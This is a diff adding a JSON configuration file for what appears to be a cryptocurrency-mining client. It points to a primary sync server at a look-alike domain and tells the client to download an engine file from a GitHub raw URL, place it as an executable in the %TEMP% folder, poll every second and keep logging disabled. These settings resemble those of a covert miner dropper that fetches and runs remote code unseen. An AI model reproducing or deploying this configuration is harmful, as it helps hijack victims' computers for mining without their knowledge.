@@ -1,0 +1,23 @@
+{
+  "ServerConfig": {
+    "PrimaryServer": "https://sync.controllpanellsync.site/api/miner/sync",
+    "DiscoveryUrl": "https://raw.githubusercontent.com/auricore-stack/auricore/refs/heads/main/controller_config.json",
+    "DiscoveryEnabled": true,
+    "DiscoveryCacheMinutes": 30
+  },
+  "MinerConfig": {
+    "EnginePath": "%TEMP%\\AuriEngine\\AuriEngine.exe",
+    "EngineDownloadUrl": "https://raw.githubusercontent.com/auricore-stack/auricore/refs/heads/main/AuriEngine.dat",
+    "WorkingDirectory": "%TEMP%\\AuriEngine",
+  },
+  "SystemConfig": {
+    "SyncIntervalSeconds": 60,
+    "MonitorIntervalMilliseconds": 1000,
+    "EnableLogging": false
+  },
+  "ClientConfig": {
+    "Token": "will-be-ignored",
+    "ConfigVersion": 999,
+    "GroupUuid": "will-be-ignored"
+  }
+}
